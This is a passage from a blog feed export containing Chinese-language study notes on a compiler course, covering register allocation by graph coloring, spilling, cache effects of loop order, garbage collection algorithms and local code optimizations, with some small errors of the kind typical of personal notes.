class="hljs-built_in">r4</span><br><span class="hljs-built_in">r1</span> := <span class="hljs-built_in">r1</span> - <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>给众多的临时变量分配有限的寄存器并且相互不冲突这是重中之重：</p><ul><li>如果在程序在某个运行点临时变量t1和t2不同时存活，那么t1和t2可以共享相同的寄存器</li><li>否则，t1和t2不能同时分配给一个寄存器</li></ul><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230520152040397.png"alt="image-20230520152040397" /><figcaption aria-hidden="true">image-20230520152040397</figcaption></figure><p>基于之间的活跃变量分析构建无向图(寄存器干扰图, RIG)：</p><ul><li>节点是临时变量</li><li>边表示这两个节点对应的变量同时在某个时刻存活</li><li>如果节点之间没有边，说明节点可以共享一个寄存器</li></ul><p>如下：</p><ul><li>例如，b和c不能在同一寄存器中</li><li>例如，b和d可以在同一寄存器中</li></ul><figure><imgsrc="https://github.com/Doraemonzzz/md-photo/blob/master/Compiler/Week8%20P2/2021050602.jpg?raw=true"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><blockquote><p>RIG构建完成后，寄存器分配算法与体系架构无关，不依赖任何机器属性</p></blockquote><h2 id="图染色">图染色</h2><p>图着色是对节点的颜色分配，使得通过边连接的节点具有不同的颜色</p><p>如果一个图可以用k种颜色按照上述规则着色，则该图形为k−colorable（这里的颜色就是寄存器，k为寄存器数量）</p><p>进一步的，如果RIG是k−colorable，则存在不超过k个寄存器的寄存器分配。</p><p>图染色算法：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">The following works well <span class="hljs-keyword">in</span> practice:<br>  – Pick <span class="hljs-keyword">a</span> node t <span class="hljs-keyword">with</span> fewer than k neighbors<br>  – Put t <span class="hljs-keyword">on</span> <span class="hljs-title">a</span> <span class="hljs-title">stack</span> <span class="hljs-title">and</span> <span class="hljs-title">remove</span> <span class="hljs-title">it</span> <span class="hljs-title">from</span> <span class="hljs-title">the</span> <span class="hljs-title">RIG</span><br>  – Repeat <span class="hljs-keyword">until</span> <span class="hljs-keyword">the</span> graph has <span class="hljs-literal">one</span> node<br>Assign colors <span class="hljs-built_in">to</span> nodes <span class="hljs-keyword">on</span> <span class="hljs-title">the</span> <span class="hljs-title">stack</span><br>  – Start <span class="hljs-keyword">with</span> <span class="hljs-keyword">the</span> <span class="hljs-keyword">last</span> node added<br>  – At <span class="hljs-keyword">each</span> step pick <span class="hljs-keyword">a</span> color different <span class="hljs-built_in">from</span> those assigned<br>  <span class="hljs-built_in">to</span> already colored neighbors<br></code></pre></td></tr></table></figure><p>下面这张图里第四个才符合题意</p><figure><imgsrc="https://github.com/Doraemonzzz/md-photo/blob/master/Compiler/Week8%20P2/2021050704.jpg?raw=true"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h2 id="变量溢出">变量溢出</h2><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230520152930506.png"alt="image-20230520152930506" /><figcaption aria-hidden="true">image-20230520152930506</figcaption></figure><p>在这种情况下，我们无法将所有值都保存在寄存器中，这个时候会选择一些变量放入内存；其他变量继续图染色，这些溢出的变量将会有以下操作：</p><p><strong>选择哪些变量溢出呢？</strong></p><p>可能的启发式方法：</p><ul><li>spill冲突最多的临时变量（这个时候边比较多）</li><li>spill定义和用途很少的临时变量（因为很少用，放到内存里，也无伤大雅）</li><li>在内部循环中避免spill（因为循环里一直会复用缓存或者寄存器，如果spill了变量到内存，可能会很大程度降低运行速度，见下面缓存部分）</li></ul><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">Before</span> <span class="hljs-keyword">each</span> operation that reads f, <span class="hljs-keyword">insert</span><br>f := <span class="hljs-keyword">load</span> fa<br><span class="hljs-keyword">After</span> <span class="hljs-keyword">each</span> operation that writes f, <span class="hljs-keyword">insert</span><br>store f, fa<br></code></pre></td></tr></table></figure><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230520152957854.png"alt="image-20230520152957854" /><figcaption aria-hidden="true">image-20230520152957854</figcaption></figure><p>重新计算活跃变量：</p><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230520153015201.png"alt="image-20230520153015201" /><figcaption aria-hidden="true">image-20230520153015201</figcaption></figure><blockquote><p>New liveness information is almost as before</p><p>​ – Note f has been split into three temporaries</p><p>fi is live only</p><p>​ – Between a fi := load fa and the next instruction</p><p>​ – Between a store fi, fa and the preceding instr.</p><p>Spilling reduces the live range of f</p><p>​ – And thus reduces its interferences</p><p>​ – Which results in fewer RIG neighbors</p></blockquote><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230520153209988.png"alt="image-20230520153209988" /><figcaption aria-hidden="true">image-20230520153209988</figcaption></figure><h2 id="管理缓存">管理缓存</h2><p>缓存的速度介于寄存器和内存中间，可作为缓冲存在，如果没有缓冲的话，寄存器和内存直接交互，由于访问内存的速度远远小于访问寄存器的速度，这样整个程序会是相对较慢的，所以缓存很重要；</p><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230520151753508.png"alt="image-20230520151753508" /><figcaption aria-hidden="true">image-20230520151753508</figcaption></figure><p>通常情况下，寄存器和内存交互的值，会放在缓存里，每次寄存器访问数据先去缓存里查找，如果没有，才去内存里查找，如果缓存一直没有命中，那么缓存也就失去了它的价值。</p><ul><li>编译器非常擅长管理寄存器<ul><li>比程序员要好得多</li></ul></li><li>但是编译器不善于管理缓存<ul><li>这个问题仍然留给程序员</li><li>尚有一个未解决的问题，编译器可以做些什么来提高缓存性能</li></ul></li></ul><p>考虑如下程序：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">for</span>(j := <span class="hljs-number">1</span>; j &lt; <span class="hljs-number">10</span>; j++)<br><span class="hljs-attribute">for</span>(i=<span class="hljs-number">1</span>; i&lt;<span class="hljs-number">1000000</span>; i++) <br><span class="hljs-attribute">a</span>[i] *= b[i]<br></code></pre></td></tr></table></figure><p>上面的代码由于内部循环很大，而且每次i都会变化，如果缓存没有足够的大小，那么a[i]和b[i]就一直命中不了缓存；相反，下面的代码在10次以内，一定都是可以缓存的，速度至少比上面代码快10倍。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">for</span>(i=<span class="hljs-number">1</span>; i&lt;<span class="hljs-number">1000000</span>; i++)<br><span class="hljs-attribute">for</span>(j := <span class="hljs-number">1</span>; j &lt; <span class="hljs-number">10</span>; j++) <br><span class="hljs-attribute">a</span>[i] *= b[i]<br></code></pre></td></tr></table></figure><p>像这种交换for循环的优化，很少有编译器实现，因为难以发现什么样的循环可以优化，事实上，大部分情况下，还是需要程序员自己去优化这种case的。</p>]]></content>
    
    
    <categories>
      
      <category>编译原理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>编译原理，计算机基础，cool</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>斯坦福cs231(编译原理)の 11 Automatic Memory Management</title>
    <link href="/emocoder/2023/05/20/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%8D%81%E4%B8%80/"/>
    <url>/emocoder/2023/05/20/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%8D%81%E4%B8%80/</url>
    
    <content type="html"><![CDATA[<h2 id="引出">引出</h2><p>自动内存管理也称之为垃圾回收(garbage collection)</p><p>手动管理内存有很多出乎意料的bug：</p><ul><li>忘记释放没有被使用的内存</li><li>忘记去掉一些无用引用，或者是野指针</li><li>偶然的内存覆盖</li><li>...</li></ul><p>内存相关bug很难发现(比如内存溢出，就需要排查很长时间)</p><p>🌰：</p><p>某个对象没有被引用了，但是对应的指针还在；突然后面该对象被覆盖了，但是指针仍然引用这块内存，这个时候使用这个指针的读写还是按照原来的类型进行读写，就很容易出现错误(原类型是8bit大小，现在的类型是16bit大小这种情况)</p><p>如何自动管理内存呢？</p><p>思路：当一个对象被创建的时候就会同时分配空间；但是当没有足够的空间可用的时候，是否可以复用那些没有被使用(引用)的对象的空间呢？</p><p>我们如何得知一个对象"没有被再次使用呢"</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean"><span class="hljs-keyword">let</span> x: A &lt;- new A <span class="hljs-keyword">in</span> &#123; x &lt;- y; ... &#125;<br></code></pre></td></tr></table></figure><p>上面的代码里newA生成的A对象后面被覆盖了，这个A对象就是没有被再次使用的对象(这里不考虑其他代码，仅考虑本行代码)，x和y共同引用一个对象。这个A对象被称作为不可达对象</p><p>不可达对象定义，当且仅当：</p><ul><li>存在寄存器指向了对象x，或者</li><li>存在某一个可达对象y指向这个x</li></ul><p>考虑如下代码：if分支始终为True</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs haxe">x &lt;- <span class="hljs-keyword">new</span> <span class="hljs-type">A</span>;<br>y &lt;- <span class="hljs-keyword">new</span> <span class="hljs-type">B</span>;<br>x &lt;- y;<br><span class="hljs-keyword">if</span> alwaysTrue() then x &lt;- <span class="hljs-keyword">new</span> <span class="hljs-type">A</span> <span class="hljs-keyword">else</span> x.foo() fi<br></code></pre></td></tr></table></figure><p>假设在<code>x &lt;- y</code> 之后，y是非活跃变量，这里：</p><ul><li>A是不可达的</li><li>B是可达的，通过x，但是B之后再也没有被使用过；</li></ul><p>所以，判断可达和不可达只是一种近似手段；</p><p>可以通过以寄存器为起点遍历引用链，寻找所有可达对象(为什么以寄存器为起点，因为只有保存在寄存器的变量才说明是参与计算的活跃的对象)，总的来说，有以下几种比较常见的垃圾回收算法：</p><ul><li>标记清除(mark and sweep)</li><li>复制转移(stop and copy)</li><li>引用计数(reference count)</li></ul><p>前两种都是内存耗尽的时候，才垃圾回收；引用计数不是等待内存耗尽的才开始进行，在没有指针指向该对象时尝试收集该对象</p><h2 id="mark-and-sweep标记清除">mark and sweep(标记清除)</h2><p>标记清除有两个步骤：</p><ul><li>the mark phase: 找到可达对象(rearchable objects)</li><li>the sweep phase: 收集可回收对象</li></ul><p>实现方式：</p><p>每个对象有一个额外的标记是否可回收的bit位</p><ul><li>该bit位初始化为0</li><li>在mark phase期间，对于所有的可达对象设置为1</li></ul><p><strong>mark phase:</strong></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">let</span> todo = &#123;<span class="hljs-keyword">all</span> roots&#125;<br><span class="hljs-keyword">while</span> todo != 空集 <span class="hljs-keyword">do</span><br>pick v 属于 todo<br>todo &lt;- todo - &#123;v&#125;<br><span class="hljs-keyword">if</span> <span class="hljs-keyword">mark</span>(v) == <span class="hljs-number">0</span> then<br><span class="hljs-keyword">mark</span>(v) &lt;- <span class="hljs-number">1</span><br><span class="hljs-keyword">let</span> v1, v2, ..., <span class="hljs-keyword">vn</span> <span class="hljs-keyword">be</span> the pointers contained in v<br>todo &lt;- todo 并集 &#123;v1, v2, ..., <span class="hljs-keyword">vn</span>&#125;<br>fi<br>od<br></code></pre></td></tr></table></figure><p><strong>sweep phase:</strong></p><p>清除阶段扫描堆空间里可以清除的对象(也就是比特标记仍为0的对象)，这些对象是不可达的，可以被视作"垃圾"。这些垃圾对象可以在清除阶段形成一段链表(可以避免堆内存碎片)</p><p>清除阶段过后，之前被设置为1的对象应该重置为0，方便下一次垃圾回收。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">siseof</span><span class="hljs-params">(p)</span></span> is the size of block starting at p，<span class="hljs-built_in">sizeof</span>(p)表示p对象所占据的大小，这里默认大部分情况下对象的内存布局是连续的<br><br><span class="hljs-selector-tag">p</span> &lt;- <span class="hljs-attribute">bottom</span> of heap<br>while <span class="hljs-selector-tag">p</span> &lt; <span class="hljs-attribute">top</span> of heap fp<br><span class="hljs-keyword">if</span> <span class="hljs-selector-tag">mark</span>(p) == <span class="hljs-number">1</span> then<br><span class="hljs-selector-tag">mark</span>(p) &lt;- <span class="hljs-number">0</span><br><span class="hljs-keyword">else</span><br>add block <span class="hljs-selector-tag">p</span>...(<span class="hljs-selector-tag">p</span> + <span class="hljs-built_in">sizeof</span>(p) - <span class="hljs-number">1</span>) to freelist<br>fi<br><span class="hljs-selector-tag">p</span> &lt;- <span class="hljs-selector-tag">p</span> + <span class="hljs-built_in">sizeof</span>(p)<br>od<br><br>这一段代码的大概意思就是从堆的起点开始出发，直到堆的终点，如果发现p为<span class="hljs-number">1</span>，则重置为<span class="hljs-number">0</span>；否则，说明是垃圾对象，把<span class="hljs-selector-attr">[start, start + sizeof(p)]</span>的内存串到freelist链表里，在每一轮结束后，别忘了对p增加本次对象的偏移量<br></code></pre></td></tr></table></figure><p>🌰：这里假设只有一个寄存器，初始的时候寄存器指向A对象</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs livescript">root -&gt; A<span class="hljs-function"><span class="hljs-params">(<span class="hljs-number">0</span>)</span> -&gt;</span> B<span class="hljs-function"><span class="hljs-params">(<span class="hljs-number">0</span>)</span> -&gt;</span> C<span class="hljs-function"><span class="hljs-params">(<span class="hljs-number">0</span>)</span> -&gt;</span> D<span class="hljs-function"><span class="hljs-params">(<span class="hljs-number">0</span>)</span> -&gt;</span> E<span class="hljs-function"><span class="hljs-params">(<span class="hljs-number">0</span>)</span> -&gt;</span> F(<span class="hljs-number">0</span>)<br><br>标记阶段后:<br>root -&gt; A<span class="hljs-function"><span class="hljs-params">(<span class="hljs-number">1</span>)</span> -&gt;</span> B<span class="hljs-function"><span class="hljs-params">(<span class="hljs-number">0</span>)</span> -&gt;</span> C<span class="hljs-function"><span class="hljs-params">(<span class="hljs-number">1</span>)</span> -&gt;</span> D<span class="hljs-function"><span class="hljs-params">(<span class="hljs-number">0</span>)</span> -&gt;</span> E<span class="hljs-function"><span class="hljs-params">(<span class="hljs-number">1</span>)</span> -&gt;</span> F(<span class="hljs-number">0</span>)<br><br>清除阶段后:<br>root -&gt; A<span class="hljs-function"><span class="hljs-params">(<span class="hljs-number">0</span>)</span> -&gt;</span> B<span class="hljs-function"><span class="hljs-params">(<span class="hljs-number">0</span>)</span> -&gt;</span> C<span class="hljs-function"><span class="hljs-params">(<span class="hljs-number">0</span>)</span> -&gt;</span> D<span class="hljs-function"><span class="hljs-params">(<span class="hljs-number">0</span>)</span> -&gt;</span> E<span class="hljs-function"><span class="hljs-params">(<span class="hljs-number">0</span>)</span> -&gt;</span> F(<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p>以上普通标记-清除的缺点：</p><p>由于一旦使用该算法的时候，已经是内存不够用了，然而在<strong>标记阶段</strong>还要借用内存去维护todo这样一个数据结构，并且这个结构的大小是不受控制的，有可能有许多垃圾需要回收，这是和垃圾回收的目的相悖的</p><p><strong>改进：</strong></p><p>todo这样的数结构可否不开辟新的空间？</p><p>todo这个数据结构是为了寻找可达对象，那么可否直接遍历对象引用图，把可达对象的bit标志位设置为呢？</p><p>对图dfs遍历，但是引用是大部分情况下是单向的，如何在图里回溯(在遍历的同时反转链表，这样回溯的时候沿着反转指针即可)，这里实际操作的时候需要注意借用临时变量(寄存器)去存储当前遍历节点，以便下一个节点使用</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">cur.next</span> = tmp(反转) // 连接上一个节点<br><span class="hljs-attr">tmp</span> = cur<span class="hljs-comment">; // 现在tmp是当前节点，给下一个节点使用</span><br><span class="hljs-attr">cur</span> = cur.next<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><blockquote><p>对象在被分配的时候一般按如下规则进行分配：</p><ul><li>挑选尽量大的空间块</li><li>按需分配</li><li>顺序且连续分配，比如有100个bit大小的自左向右的连续内存空间，现在要分配50bit给某个对象，那么分配的就是前50bit</li></ul></blockquote><p>标记—清除的优势：</p><ul><li>碎片化内存，更多的使用内存碎片，减少空间利用率</li><li>对象在垃圾回收的时候不需要移动，也就是对应的指针也不会变化(这在一些允许自己手动管理内存的语言很重要，如C，C++，不会引起歧义)</li></ul><h2 id="stop-and-copy">stop and copy</h2><p>内存被划分为两块：</p><ul><li>old space: 用于分配内存</li><li>new space: 为垃圾回收备用</li></ul><p>另外有一个heap pointer, 总是指向oldspace的下一个可用空间，所以，分配内存仅仅在增加heap pointer</p><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230520103417917.png"alt="image-20230520103417917" /><figcaption aria-hidden="true">image-20230520103417917</figcaption></figure><p>stop and copy的特点：</p><ul><li>仅仅从old space copy可达对象到newspace(所以当垃圾很多的时候，这种算法效率很高)</li><li>垃圾被留在了old space</li><li>在copy之后，new space比垃圾回收之前的old space占用的空间更少</li><li>在copy结束之后，old space和new space交换</li><li>由于需要移动scan pointer和allocpointer，和标记-清除一样，需要知道对象的大小</li><li>由于对象被移动了，函数堆栈里的相关指针必须更新</li></ul><p>每次copy之后，需要更新被copy对象内部的指针，因为其指向后续也会发生copy才对，如何让其指针引用的对象指向最新的已经copy的对象？可以在每个对象增加一个关于转移指针的字，如果对象发生了copy，那么转移指针有值且指向最新的地址，</p><blockquote><p>总结：转移指针就是存在于旧对象里指向新拷贝对象的一个指针，作用是方便后续引用该对象的指针能够根据转移指针正确更新，另外就是标记旧的对象已经被拷贝了</p></blockquote><p>所以stop and copy的目标是寻找到所有的可达对象并copy至newspace，对于当前copy对象，还需要更新其内部的所有指针</p><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230520111956200.png"alt="image-20230520111956200" /><figcaption aria-hidden="true">image-20230520111956200</figcaption></figure><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-keyword">while</span> scan &lt;&gt; alloc <span class="hljs-keyword">do</span><br><span class="hljs-keyword">let</span> O be the <span class="hljs-type">object</span> at scan pointer<br><span class="hljs-keyword">for</span> <span class="hljs-keyword">each</span> pointer p contained <span class="hljs-keyword">in</span> O <span class="hljs-keyword">do</span><br>find O<span class="hljs-comment">&#x27; that p points to</span><br><span class="hljs-keyword">if</span> O<span class="hljs-comment">&#x27; is without a forwarding pointer</span><br>copy O<span class="hljs-comment">&#x27; to new space (update alloc pointer)</span><br><span class="hljs-keyword">set</span> a word <span class="hljs-keyword">of</span> old O<span class="hljs-comment">&#x27; to point the new copy (这一步就是标记旧的对象已经被拷贝了)</span><br>change p <span class="hljs-keyword">to</span> point <span class="hljs-keyword">to</span> the <span class="hljs-built_in">new</span> copy <span class="hljs-keyword">of</span> O<span class="hljs-comment">&#x27;</span><br><span class="hljs-keyword">else</span><br><span class="hljs-keyword">set</span> p <span class="hljs-keyword">in</span> O equal <span class="hljs-keyword">to</span> the forwarding pointer<br><span class="hljs-keyword">end</span> <span class="hljs-keyword">for</span><br>increment scan pointer <span class="hljs-keyword">to</span> the <span class="hljs-keyword">next</span> <span class="hljs-type">object</span><br>od<br></code></pre></td></tr></table></figure><p>优点：</p><ul><li>相对比较快，尤其垃圾比较多的时候，因为只需要处理可达对象</li><li>分配内存是简单且快速的，因为只需要增加heap pointer</li></ul><p>缺点：</p><ul><li>一些语言，如C和C++不允许对象拷贝，以及指针转移，<strong>因为指针作为对象语义的一部分在程序中公开</strong></li></ul><p>针对C和C++不允许对象拷贝，以及指针转移，有一些Conservativecollection技术</p><h2 id="引用计数">引用计数</h2><p>在没有耗尽内存的时候就开始对对象的引用数（每个分配操作都会引起引用计数），进行计数，一旦计数为0，说明该对象需要被回收了。</p><p><code>rp(x)为x的引用计数</code></p><p>每个赋值<code>x &lt;- y</code> ，这里假设x,y对象分别指向o和p：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">rc</span><span class="hljs-params">(p)</span></span> &lt;- <span class="hljs-built_in">rc</span>(p) + <span class="hljs-number">1</span><br><span class="hljs-function"><span class="hljs-title">rc</span><span class="hljs-params">(o)</span></span> &lt;- <span class="hljs-built_in">rc</span>(o) + <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">rc</span>(o) == <span class="hljs-number">0</span>) then free o<br>x &lt;- y<br></code></pre></td></tr></table></figure><p><strong>优点：</strong></p><ul><li>易于实现</li><li>增量收集垃圾，而不会在执行过程中出现大量的停顿，因为它在没有耗尽内存的时候就开始对对象的引用数，每次赋值语句都可能会引起垃圾回收，但是每次的垃圾都是增量变化的，并不会占据很多时间。</li></ul><p><strong>缺点：</strong></p><ul><li>无法处理循环引用</li></ul><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf">x -&gt; A <span class="hljs-operator">=</span>&gt; B <span class="hljs-operator">=</span>&gt;A<br><span class="hljs-attribute">x</span> <span class="hljs-operator">=</span> null<br></code></pre></td></tr></table></figure><p>上面语句里，x是一个指针引用了A，而A又引用了B，当x不再指向A的时候，由于A和B的引用计数始终不为0，所以没有办法回收A和B</p><ul><li>在每次分配时处理引用计数有的时候比较慢，如果一个赋值一句牵连到了很多对象，那么引用计数就会计算这些对象，可以在编译的时候优化这些赋值语句，比如如果有一个对象的两次更新，可以优化成一次，这样就会计算一次引用计数了。</li></ul><h2 id="总结">总结</h2><p>自动内存管理可防止严重的存储错误</p><p>But，也减少了程序员对内存的控制：</p><ul><li>例如，内存中的数据布局</li><li>例如，何时重新分配内存</li></ul><p>常见的自动内存管理问题：</p><ul><li>实时应用里可能由于垃圾回收时间过长出现短暂的程序停止</li><li>内存泄漏，一般多是程序员没有及时回收"野"对象</li></ul><p>有一些更高级的垃圾回收算法：</p><ul><li>concurrent: 垃圾回收的同时允许程序运行</li><li>generational：不会扫描长期存活对象（v8里就有）</li><li>real time: 减少因为垃圾回收引起的程序停止的下界</li><li>parallel: 允许多个垃圾回收器同时运行；</li></ul>]]></content>
    
    
    <categories>
      
      <category>编译原理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>编译原理，计算机基础，cool</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>斯坦福cs231(编译原理)の 9 Optimization</title>
    <link href="/emocoder/2023/05/14/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%B9%9D/"/>
    <url>/emocoder/2023/05/14/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%B9%9D/</url>
    
    <content type="html"><![CDATA[<p>本文是斯坦福cs143编译原理的笔记，内容大部分来自于课件和自己的理解，笔者能力和精力有限，如果有错误欢迎指出</p><hr /><h2 id="中间代码">中间代码</h2><p>什么是中间代码？一般常指介于高级语言(源语言)和低级语言(汇编语言)的一种语言</p><ul><li>Provides an intermediate level of abstraction<ul><li>More details than the source</li><li>Fewer details then the target</li></ul></li></ul><p>source lang =&gt;intermediate lang =&gt; target lang</p><p>intermediate lang = high-level assembly</p><ul><li>uses register names, but has unlimited number</li><li>Uses control structures like assemblly language</li><li>uses opcodes but some are higher level<ul><li>Eg: push translates to serveral assembly instructions</li><li>most opcodes correspond directly to assembly opcodes</li></ul></li></ul><p>每个指令都是以下两种形式之一(三地址码)：</p><ul><li>x := y op z</li><li>x := op y</li></ul><p>🌰：表达式 x + y * z可以转换成如下中间代码形式(每一个子表达式都有一个(寄存器)名称)：</p><ul><li><p>t1 := y * z</p></li><li><p>t2 := x + t1</p></li></ul><p><strong>总结</strong></p><p>中间代码的好处：与机器无关，可以在中间代码实现优化，提高了程序在不同系统架构之间迁移的可能性</p><h2 id="优化">优化</h2><p>Optimization is complex and largest phase</p><p>Parsing =&gt; Semantic =&gt; Opt =&gt; Gen</p><p>什么时候做优化？</p><ul><li>On AST ?<ul><li>Pro: Machine independent</li><li>Cons: Too high level</li></ul></li><li>On assembly lang ?<ul><li>Pro: Exposes optimization oppotunities</li><li>Cons: Machine dependent</li><li>Cons: Must reimplement optimizations when retargetting</li></ul></li><li>On intermediate lang ?<ul><li>Pro: machine independent</li><li>Pro: Exposes optimization oppotunities</li></ul></li></ul><p><strong>Basic Block:</strong> is a maximal sequence of instructionswith:</p><ul><li>no labels (except at the first instructions), and</li><li>no jumps (except at the last instructions)</li></ul><blockquote><p>其实就是指一段除了起始入口和末尾跳转(退出)指令没有其他跳转(退出)指令的一段指令集</p></blockquote><p>A basic block is a single-entry, single-exit, straight-line codesegment</p><blockquote><p>单一入口，单一出口，一行一行执行的程序段</p></blockquote><p><strong>control-flow graph</strong>：is a directed graph with:</p><ul><li>Basic blocks as nodes</li><li>An edge from block A to block B if the execution can pass from thelast instruction in A to the first instruction in B</li></ul><p>​ eg:</p><ul><li>the last instruction in A is <code>jump LabelB</code></li><li>execution can fall through from block A to block B (在blockA执行失败了后跳转到了block B)</li></ul><p>优化的好处：</p><ul><li>提高执行时间</li><li>减小代码体积</li><li>减少网络传输量</li><li>减小内存的使用</li><li>减小硬盘的使用（存储汇编代码文件）</li><li>减少硬件使用的电量 (这也可以，...)</li></ul><p>优化的三个粒度：</p><ul><li>local optimizations (局部优化)<ul><li>Apply to a basic block isolation</li></ul></li><li>global optimizations (全局优化)<ul><li>Apply to a control-flow in isolation</li></ul></li><li>Inter-procedural optimizations<ul><li>Apply across method boundaries</li></ul></li></ul><p>实际情况下：很难实现一个非常理想化的优化算法</p><ul><li>为什么？<ul><li>某些优化难以实现</li><li>某些优化会花费大量的编译时间</li><li>一些优化的回报很低</li><li>很多花哨的优化同时满足这三点</li></ul></li></ul><h2 id="局部优化">局部优化</h2><p>优化基本block，不涉及整个代码，比较简单</p><p><strong>algebra optimization (代数优化)</strong></p><p>有些运算可以被另一些更快的运算代替：</p><p>x := x * 8 =&gt; x := x &lt;&lt; 3</p><p><strong>Constant fold（常数折叠）</strong></p><p>Operations on constants can be computed at compile time:</p><ul><li>if there is a statement x := y op z</li><li>and y and z constants</li><li>then y op z can be computed at compile time</li></ul><p>Eg: x := 2 + 2 =&gt; x := 4; if 2 &lt; 0 jump L can be deleted</p><p>常数折叠也并不安全，因为会存在交叉编译的情况：</p><p>在X架构上编译到架构Y上运行，编译后的产物在X上运行和在Y上运行可能会产生不同的结果</p><p>X: a : = 1.2 + 6.9 经过常数折叠后=&gt; a := 8.1</p><p>Y: a: = 8</p><p><strong>单一赋值形式</strong>：每一个寄存器名称仅仅出现在一次在赋值语句的左侧</p><p>x := z + b := z + y</p><p>a := x =&gt; a := b</p><p>x := 2 * x x := 2 * b</p><p>这里有一个很重要的概念，和变量活跃度有关：Single assigment form</p><p>基于这个假设：如果基本块是以单一赋值形式出现的，即 <code>x:=</code>是在该块内仅有的一次为x赋值</p><p>那么当块内出现了相同的右侧表达式，这个表达式就是重复的（<strong>Commonsubexpression elimination</strong>）</p><p>🌰: 这个例子里x，y和z的值在省略号里是不会改变的</p><p>x := y + z x := y + z</p><p>... =&gt; ...</p><p>w := y + z w := x</p><p><strong>Copy propagatation（拷贝传播）</strong></p><p>假设基本块是以单一赋值形式存在的：</p><p>if w := x appears in a block, replace subsequent uses of w with usesof x</p><p>🌰:</p><p>b := z + y b := z + y</p><p>a := b =&gt; a := b</p><p>x := 2 * a x := 2 * b</p><p><strong>Dead code elimination</strong></p><p>上面的<code>a := b</code>对代码结果没什么恭喜，可以删除</p><p><strong>Unresearchable code 